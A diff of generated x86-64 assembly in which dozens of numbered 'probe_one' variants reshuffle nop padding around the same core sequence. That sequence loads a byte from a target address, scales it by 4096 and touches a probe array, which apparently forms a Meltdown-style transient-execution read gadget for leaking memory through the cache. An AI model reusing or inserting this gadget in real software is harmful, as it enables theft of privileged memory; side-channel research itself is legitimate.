 .Lprobe_one_win0_var258:
@@ -4980,73 +4980,73 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 259
 .Lprobe_one_win0_var259:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 260
 .Lprobe_one_win0_var260:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
+	nop
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 261
 .Lprobe_one_win0_var261:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 262
 .Lprobe_one_win0_var262:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	nop
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 263
@@ -5054,29 +5054,29 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 264
 .Lprobe_one_win0_var264:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 265
@@ -5084,22 +5084,21 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 266
 .Lprobe_one_win0_var266:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
@@ -5107,37 +5106,38 @@ probe_one:
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 267
 .Lprobe_one_win0_var267:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 268
 .Lprobe_one_win0_var268:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
+	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 269
 .Lprobe_one_win0_var269:
@@ -5147,10 +5147,10 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -5158,43 +5158,43 @@ probe_one:
 .Lprobe_one_win0_var270:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 271
 .Lprobe_one_win0_var271:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 272
 .Lprobe_one_win0_var272:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -5204,14 +5204,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 274
@@ -5219,27 +5219,27 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
-	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 275
 .Lprobe_one_win0_var275:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -5248,15 +5248,15 @@ probe_one:
 .Lprobe_one_win0_var276:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 277
@@ -5265,13 +5265,13 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 278
@@ -5279,14 +5279,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	nop
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 279
@@ -5294,29 +5294,29 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
-	shlq	$0xc, %rax
 	nop
+	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 280
 .Lprobe_one_win0_var280:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 281
@@ -5325,29 +5325,29 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 282
 .Lprobe_one_win0_var282:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
 	nop
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 283
 .Lprobe_one_win0_var283:
@@ -5357,8 +5357,8 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	jz	92b
 	nop
+	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -5368,28 +5368,28 @@ probe_one:
 .Lprobe_one_win0_var284:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
 	nop
 	nop
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 285
 .Lprobe_one_win0_var285:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -5402,56 +5402,56 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 287
 .Lprobe_one_win0_var287:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 288
 .Lprobe_one_win0_var288:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 289
 .Lprobe_one_win0_var289:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 290
@@ -5462,38 +5462,38 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 291
 .Lprobe_one_win0_var291:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
-	jz	92b
 	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 292
 .Lprobe_one_win0_var292:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -5503,58 +5503,58 @@ probe_one:
 .Lprobe_one_win0_var293:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 294
 .Lprobe_one_win0_var294:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 295
 .Lprobe_one_win0_var295:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 296
 .Lprobe_one_win0_var296:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	nop
@@ -5563,16 +5563,16 @@ probe_one:
 .Lprobe_one_win0_var297:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 298
 .Lprobe_one_win0_var298:
@@ -5580,13 +5580,13 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 299
@@ -5594,30 +5594,30 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 300
 .Lprobe_one_win0_var300:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 301
 .Lprobe_one_win0_var301:
@@ -5630,23 +5630,23 @@ probe_one:
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 302
 .Lprobe_one_win0_var302:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 303
@@ -5654,9 +5654,9 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -5671,13 +5671,13 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 305
 .Lprobe_one_win0_var305:
@@ -5685,10 +5685,10 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -5700,23 +5700,23 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 307
 .Lprobe_one_win0_var307:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
@@ -5729,41 +5729,41 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 309
 .Lprobe_one_win0_var309:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 310
 .Lprobe_one_win0_var310:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -5775,13 +5775,13 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 312
@@ -5791,28 +5791,28 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 313
 .Lprobe_one_win0_var313:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 314
 .Lprobe_one_win0_var314:
@@ -5820,28 +5820,28 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 315
 .Lprobe_one_win0_var315:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 316
@@ -5851,9 +5851,9 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -5864,59 +5864,59 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 318
 .Lprobe_one_win0_var318:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
 	nop
 	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 319
 .Lprobe_one_win0_var319:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 320
 .Lprobe_one_win0_var320:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 321
@@ -5924,25 +5924,25 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 322
 .Lprobe_one_win0_var322:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
@@ -5954,15 +5954,15 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 324
 .Lprobe_one_win0_var324:
@@ -5970,24 +5970,24 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 325
 .Lprobe_one_win0_var325:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -6001,43 +6001,43 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 327
 .Lprobe_one_win0_var327:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 328
 .Lprobe_one_win0_var328:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 329
 .Lprobe_one_win0_var329:
@@ -6046,28 +6046,28 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 330
 .Lprobe_one_win0_var330:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 331
 .Lprobe_one_win0_var331:
@@ -6075,37 +6075,37 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 332
 .Lprobe_one_win0_var332:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 333
 .Lprobe_one_win0_var333:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
@@ -6118,41 +6118,41 @@ probe_one:
 .Lprobe_one_win0_var334:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
+	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 335
 .Lprobe_one_win0_var335:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	nop
+	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 336
 .Lprobe_one_win0_var336:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -6164,14 +6164,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	nop
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 338
@@ -6179,57 +6179,57 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 339
 .Lprobe_one_win0_var339:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	movb	(%rdx), %al
+	nop
+	nop
+	nop
+	shlq	$0xc, %rax
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 340
 .Lprobe_one_win0_var340:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 341
 .Lprobe_one_win0_var341:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -6241,13 +6241,13 @@ probe_one:
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 343
 .Lprobe_one_win0_var343:
@@ -6257,11 +6257,11 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 344
@@ -6274,25 +6274,25 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
